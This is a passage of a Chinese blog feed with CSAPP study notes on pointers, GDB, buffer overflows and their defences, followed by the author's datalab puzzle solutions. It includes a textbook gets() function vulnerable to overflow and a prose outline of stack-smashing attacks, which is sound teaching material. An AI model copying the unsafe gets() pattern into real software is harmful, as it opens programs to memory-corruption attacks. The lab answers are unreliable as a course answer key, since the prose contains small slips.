title="指针"></a>指针</h4><p><del>指针我一生之敌！</del></p><p>指针是C语言的特色，它们允许程序直接访问计算机内存中的数据。每个指针都对应一个类型，表示了它指向的内存为什么数据类型。</p><p>以下是指针的特点：</p><ul><li><code>*</code> 操作符是间接引用指针，结果数据是该指针的类型</li><li>每个指针都有一个值，这个值就是某个指定类型对象的地址，NULL(0) 也是一个值，表示指针并没有指向任何地方</li><li>对指针进行强制类型转换值，改变它的类型，不改变它的值</li><li>指针可以指向函数</li></ul><p>我们这样来声明一个指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">type *name ;   <br>type (*name) (arglist) ;  <span class="hljs-comment">//指向函数，括号必须将*和函数名括在一起</span><br></code></pre></td></tr></table></figure><h4 id="GDB调试器"><a href="#GDB调试器" class="headerlink" title="GDB调试器"></a>GDB调试器</h4><p>GNU 调试器 GDB 提供了许多有用的特性，支持机器级程序运行时的分析。我们可以用下面的指令启动GDB并调试程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">gdb filename</span><br></code></pre></td></tr></table></figure><p>输入 help(h) 就可以查看具体的命令，常用的命令如下：</p><table><thead><tr><th>调试命令 (缩写)</th><th>作用</th></tr></thead><tbody><tr><td>break (b)  xxx</td><td>在源代码指定的某一行设置断点，其中 xxx 用于指定具体打断点位置</td></tr><tr><td>run (r）</td><td>执行被调试的程序，其会自动在第一个断点处暂停执行</td></tr><tr><td>continue (c）</td><td>当程序在某一断点处停止后，用该指令可以继续执行，直至遇到断点或者程序结束</td></tr><tr><td>next (n)</td><td>令程序一行代码一行代码的执行</td></tr><tr><td>step（s）</td><td>如果有调用函数，进入调用的函数内部；否则，和 next 命令的功能一样</td></tr><tr><td>until (u)</td><td>当你厌倦了在一个循环体内单步跟踪时，单纯使用 until 命令，可以运行程序直到退出循环体</td></tr><tr><td>until n</td><td>命令中，n 为某一行代码的行号，该命令会使程序运行至第 n 行代码处停止</td></tr><tr><td>print (p）xxx</td><td>打印指定变量的值，其中 xxx 指的就是某一变量名</td></tr><tr><td>list (l)</td><td>显示源程序代码的内容，包括各行代码所在的行号</td></tr><tr><td>finish（fi）</td><td>结束当前正在执行的函数，并在跳出函数后暂停程序的执行</td></tr><tr><td>return（return）</td><td>结束当前调用函数并返回指定值，到上一层函数调用处停止程序执行</td></tr><tr><td>jump（j)</td><td>使程序从当前要执行的代码处，直接跳转到指定位置处继续执行后续的代码</td></tr><tr><td>quit (q)</td><td>终止调试，退出 GDB shell</td></tr><tr><td>kill (k)</td><td>杀死程序，强制终止正在被调试的异常程序</td></tr></tbody></table><h4 id="内存越界引用和缓冲区溢出"><a href="#内存越界引用和缓冲区溢出" class="headerlink" title="内存越界引用和缓冲区溢出"></a>内存越界引用和缓冲区溢出</h4><p>C在数组引用的时不会进行任何边界检查，而且局部变量和状态信息都存放在栈中，两者结合起来就会导致严重的程序错误，破坏栈中存储的信息，如果保持这个被破坏的信息并试图重新加载寄存器或者尝试执行 ret ，就会导致程序发生错误。</p><p>一种常见的状态破坏被称为<strong>缓冲区溢出</strong>，通常发生子啊在我们在栈中分配字符数组的时候，输入的字符串的长度超出了为它分配的空间大小。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">echo</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>    gets(buf);    <span class="hljs-comment">//gets不会对输入数据的长度进行判断，只有遇到&quot;\n&quot;才会停止读取</span><br>    <span class="hljs-built_in">puts</span>(buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pushq    %rbp<br>movq    %rsp, %rbp<br>subq    $16, %rsp<br>leaq    -8(%rbp), %rax<br>movq    %rax, %rdi<br>movl    $0, %eax<br>call    gets@PLT<br>leaq    -8(%rbp), %rax<br>movq    %rax, %rdi<br>call    puts@PLT<br>nop<br>leave<br>ret<br></code></pre></td></tr></table></figure><p>其中有指令 <code>leaq -8(%rbp), %rax</code> 的意思就是将相对于基指针 <code>rbp</code> 的地址偏移 <code>-8</code>加载到寄存器 <code>rax</code> 中，也就是说一旦输入超过了 8 字节，就会覆盖 <code>rbp</code> 所在的位置，再长 8 字节就会覆盖住返回地址。</p><p>缓冲区溢出的致命使用就是让程序执行本来不该执行的函数，这也是一种最常见的网络攻击的方法。我们称编写的攻击代码为 exploit code ，直接输入的字节被称为 payload。一般情况下，攻击代码可能会尝试启动一个 shell 程序，这样攻击者就可以获取对受害计算机直接操控的权限。</p><h4 id="对抗缓冲区溢出攻击"><a href="#对抗缓冲区溢出攻击" class="headerlink" title="对抗缓冲区溢出攻击"></a>对抗缓冲区溢出攻击</h4><p>GCC 提供了一些机制来防止攻击者利用缓冲区溢出来获取系统控制权限，如下：</p><ul><li><p>栈随机化</p><p>一般情况下，程序每次运行的虚拟地址都是固定不变的，这样我们就可以直接将想要执行的函数地址覆盖在返回地址上。</p><p>栈随机的思想使得每次程序运行时栈的位置都有变化，这类技术我们成为 <strong>地址空间布局随机化（Address-Space Layout Randomization，ASLR）</strong>。原理是每次运行程序时，程序的不同部分包括程序代码、库代码和全局变量等数据都会被加载到内存的不同区域。</p><p>当然攻击者也有对抗保护的方法，就是在实际的的攻击代码前面插入很多 nop 指令，那么我们只要任意命中一个 nop 都可以导致我们恶意代码的顺利执行。这个序列常用的术语 “nop sled” 就是”滑“过序列的意思。</p></li><li><p>栈破坏检测</p><p>栈破坏检测是在栈已经被破坏后进行的防御措施，GCC 中对应的机制叫做栈保护者（stack-protector）。其思想是在缓冲区和返回地址之前插入一段随机数，在函数返回之前检查这个随机数是否被更改，如果被更改就终止程序。这个随机数叫做金丝雀（canary）值。</p></li><li><p>栈不可执行</p><p>这个保护措施直接限制了攻击者像系统中插入可执行代码的行为，也就是 NX（No-Execute），通过这个特性我们可以将栈设置为不可执行，也就是向栈上插入的代码是不会运行的。</p></li></ul><h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><p><del>书上还有一小节浮点数的部分</del></p><p>当前使用的 AVX 指令集中，浮点数的机器代码风格和整数数据的各种操作类似，不同就在于寄存器和指令的表示，浮点数通常有专用的浮点寄存器和浮点指令。</p><blockquote><p>AVX 指令集是英特尔（Intel）和AMD（Advanced Micro Devices）处理器架构中的一种 SIMD（Single Instruction, Multiple Data，单指令多数据）扩展指令集</p></blockquote><hr><p>我要开始快乐国庆节噜！！</p><p>身上颓废的上学味已经消散，现在我浑身都散发着浓郁的爱国气息🥳</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第二章 datalab</title>
    <link href="/2023/09/19/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/"/>
    <url>/2023/09/19/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/</url>
    
    <content type="html"><![CDATA[<p>哦我的上帝实验怎么是英文版的😶‍🌫️</p><span id="more"></span><p>上周小学期一直做项目没学习，正好做做实验复习一下</p><h2 id="int"><a href="#int" class="headerlink" title="int"></a>int</h2><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><p>题目要求：只使用 ~ 和 &amp; 来实现 ^ 操作</p><blockquote><p>复习环节</p><p>~  按位非（每位二进制取反），&amp; 按位与（对应位同为1结果位才为1）,| 按位或（只要有一位是1结果位就是1），^ 亦或（对应位相同为0，不同为1）</p></blockquote><p>首先可以想到 <code>x^y = x&amp;~y + ~x&amp;y = (x&amp;~y)|(~x&amp;y)</code></p><p>接下来想办法替代 <code>|</code>，<code>x|y=~(~x&amp;~y)</code>，所以最后的结果是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * bitXor - x^y using only ~ and &amp; </span><br><span class="hljs-comment"> *   Example: bitXor(4, 5) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp;</span><br><span class="hljs-comment"> *   Max ops: 14</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bitXor</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-keyword">return</span> ~(~(x&amp;~y)&amp;~(~x&amp;y));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><p>题目要求：使用 ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; 来获取 int 的最小值</p><blockquote><p>复习环节</p><p>！逻辑非，&lt;&lt; 左移， &gt;&gt; 右移</p></blockquote><p>最小值其实就是1后面31个0，但我们不能使用超过 8bit 的常数。可以使用左移运算，让初始常数1左移31位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">tmin</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><p>题目要求：判断 x 是不是 int 的最大值</p><blockquote><p>复习环节：</p><p>! 逻辑非，将非零数值转换为1，而 0 保持不变</p></blockquote><p>根据上题我们得出最小值，取反就能得到最大值也就是 <code>~(1&lt;&lt;32)</code> 。</p><p>如果 x 和最大值一样，那么每一位都是一样的的，我们就可以使用异或操作如果两边相等就返回 0，最后逻辑非将0转化为1就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span><br><span class="hljs-comment"> *     and 0 otherwise </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | +</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isTmax</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> !(~(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)^x);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><p>题目要求：判断所给出的数字奇数位是否都为 1 。</p><p>根据题目提示0xAAAAAAAA的奇数位都是1，偶数位都是0，我们考虑直接用它来和原来的数字进行按位与运算再和AAA异或。但又由于位数不能超过 8 bit，需要利用左移运算，左移以后再和原来的值进行与运算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span><br><span class="hljs-comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span><br><span class="hljs-comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">allOddBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>     <span class="hljs-type">int</span> y=(<span class="hljs-number">0xAA</span>&lt;&lt; <span class="hljs-number">8</span>)|<span class="hljs-number">0xAA</span>;<br>     y= y|(y&lt;&lt;<span class="hljs-number">16</span>);<br>     <span class="hljs-keyword">return</span> !((y&amp;x)^y) ;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><p>题目要求：取目标数值的相反数</p><p>负数就是按位取反以后加一</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">negate</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><p>题目要求：如果 0x30 &lt;&#x3D; x &lt;&#x3D; 0x39，则返回 1</p><p>判断目标值和已知数值的大小只要做减法就可以，但是这个式子不能用 - ，考虑按照上题方法取反后相加，再看结果值符号位的正负即可。</p><blockquote><p>括号一定要括对😿</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span><br><span class="hljs-comment"> *   Example: isAsciiDigit(0x35) = 1.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x3a) = 0.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x05) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> !((x+(~<span class="hljs-number">0x30</span>+<span class="hljs-number">1</span>))&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>))&amp;!!((x+(~<span class="hljs-number">0x3a</span>+<span class="hljs-number">1</span>))&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><p>题目要求：实现 x ? y : z （x 不为 0 返回 y ，为 0 返回 z ）</p><p>对于 x 是否为0，我们可以采用两次 ! 运算来实现即 <code>!!0=0</code> ，<code>!!3=1</code> 。</p><p>我们知道，任何书与所有位全是1的值的结果都是它本身，同样与位全是0的数就是0。根据掩码的规范，所有位都是 1 的值是十进制的 -1，所以我们需要对逻辑与之后的结果取倒数就是 <code>(~!!x+1)</code> 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * conditional - same as x ? y : z </span><br><span class="hljs-comment"> *   Example: conditional(2,4,5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 16</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">conditional</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> z)</span> &#123;<br>    <span class="hljs-keyword">return</span> ((~!!x+<span class="hljs-number">1</span>)&amp;y)|(~(~!!x+<span class="hljs-number">1</span>)&amp;z);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><p>题目要求：如果 x &lt;&#x3D; y 则返回 1，否则返回 0</p><p>本来想的是像前面的题一样直接相减就行了，但是想到可能会有溢出的问题。</p><p>解决方法是先判断符号位，如果两个数符号相同再做差，符号不同就可以直接返回结果了。</p><table><thead><tr><th>正负</th><th>sign_x</th><th>sign_y</th><th>返回值</th></tr></thead><tbody><tr><td>x正 y负</td><td>0</td><td>1</td><td>0</td></tr><tr><td>y正 x负</td><td>1</td><td>0</td><td>1</td></tr></tbody></table><p>观察结果可以发现返回值就等于 <code>sign_x&amp;(!sign_y)</code> 。</p><p>还需要考虑两个数相等的情况，相等时符号位为 0 。可以转换思路绕过这个情况，在数据都是整数时 <code>x&lt;=y</code> 也就是 <code>x&lt;y+1</code>，所以做差的计算式就变成了 <code>x+(~y+1)-1</code> 也就是 <code>x+~y</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-type">int</span> sign_x=x&gt;&gt;<span class="hljs-number">31</span>;<br>    <span class="hljs-type">int</span> sign_y=y&gt;&gt;<span class="hljs-number">31</span>;<br>    <span class="hljs-type">int</span> result1=sign_x&amp;(!sign_y); <span class="hljs-comment">//符号不同的返回结果</span><br>    <span class="hljs-type">int</span> flag=!(sign_x^sign_y);   <span class="hljs-comment">//判断符号是否相同</span><br>    <span class="hljs-keyword">return</span> result1|flag&amp;((x + ~y) &gt;&gt; <span class="hljs-number">31</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><p>题目要求：实现逻辑非的功能</p><p>逻辑非无非就是需要想一想 0 和非零数之间的区别。0 的正负数都相等，但是其他数的正负不同，我们可以利用这个特性将目标数据取相反数后异或，再判断符号位，相同返回 0，不同返回 1 。</p><p>由于符号位为 1 ，右移后的结果便为0x11111111, 令其加 1 ，刚好为 0（这是因为在补码表示法中，负数的绝对值可以通过取反加1来获得）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalNeg - implement the ! operator, using all of </span><br><span class="hljs-comment"> *              the legal operators except !</span><br><span class="hljs-comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">logicalNeg</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> ((x|(~x+<span class="hljs-number">1</span>))&gt;&gt;<span class="hljs-number">31</span>)+<span class="hljs-number">1</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><p>题目要求：返回表示 x 所需的最小位数</p><p><del>这道题完全没思路，是看别的师傅的博客才明白的</del></p><p>首先让所有的数据都变成正值，然后利用二分法来判断二分后的最高位是否全是0，再判断是否全是1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* howManyBits - return the minimum number of bits required to represent x in</span><br><span class="hljs-comment"> *             two&#x27;s complement</span><br><span class="hljs-comment"> *  Examples: howManyBits(12) = 5</span><br><span class="hljs-comment"> *            howManyBits(298) = 10</span><br><span class="hljs-comment"> *            howManyBits(-5) = 4</span><br><span class="hljs-comment"> *            howManyBits(0)  = 1</span><br><span class="hljs-comment"> *            howManyBits(-1) = 1</span><br><span class="hljs-comment"> *            howManyBits(0x80000000) = 32</span><br><span class="hljs-comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *  Max ops: 90</span><br><span class="hljs-comment"> *  Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">howManyBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-type">int</span> sign ;<br>    sign = x&gt;&gt;<span class="hljs-number">31</span>;<br>    x = (~x&amp;sign)|(~sign&amp;x);   <span class="hljs-comment">//全部换成为正数</span><br>    <br>    <span class="hljs-type">int</span> bit_16 =(!!(x &gt;&gt; <span class="hljs-number">16</span>)) &lt;&lt; <span class="hljs-number">4</span>;    <span class="hljs-comment">//检测是否有1</span><br>    x = x &gt;&gt; bit_16;      <span class="hljs-comment">//将已经检测过的高16位移出去留下低位</span><br><span class="hljs-type">int</span> bit_8 = !!(x&gt;&gt;<span class="hljs-number">8</span>)&lt;&lt;<span class="hljs-number">3</span>;<br>x = x &gt;&gt; bit_8;<br>  <span class="hljs-type">int</span> bit_4 = !!(x &gt;&gt; <span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-number">2</span>;<br>  x = x &gt;&gt; bit_4;<br>  <span class="hljs-type">int</span> bit_2 = !!(x &gt;&gt; <span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-number">1</span>;<br>  x = x &gt;&gt; bit_2;<br>  <span class="hljs-type">int</span> bit_1 = !!(x &gt;&gt; <span class="hljs-number">1</span>);<br>  x = x &gt;&gt; bit_1;<br>  <span class="hljs-type">int</span> bit_0 = x;<br>  <span class="hljs-keyword">return</span> bit_16+bit_8+bit_4+bit_2+bit_1+bit_0+<span class="hljs-number">1</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="float"><a href="#float" class="headerlink" title="float"></a>float</h2><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><p>题目要求：将传入的无符号整型数转换为浮点数 <code>f*2</code> 返回</p><blockquote><p>复习环节：</p><p>浮点数有三部分，符号 s（最高位） ，阶码 exp（八位）和 尾数 frac。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/2-IEEE%E6%B5%AE%E7%82%B9%E6%95%B0%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95.png"></p></blockquote><p>先分为三个部分，再分不同条件进行判断</p><ul><li><p>exp&#x3D;&#x3D;0</p><p>此时浮点数的值是一个接近于 0 的二进制小数，可以通过将尾数部分左移 1 位来将其乘以 2。然后，将符号位重新添加回去，得到乘以 2 后的规格化浮点数。</p></li><li><p>exp&#x3D;&#x3D;255</p><p>按题目要求直接返回 uf</p></li><li><p>其他情况</p><p>exp 指数加1，对它乘2^1也就是乘2</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsign int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsign operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatScale2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>    <span class="hljs-comment">// 分离符号位</span><br>    <span class="hljs-type">int</span> s = (uf &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 分离指数位</span><br>    <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span> = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    <span class="hljs-comment">// 分离尾数位</span><br>    <span class="hljs-type">int</span> frac = uf &amp; <span class="hljs-number">0x7FFFFF</span>;<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span> == <span class="hljs-number">0xFF</span>) <br>    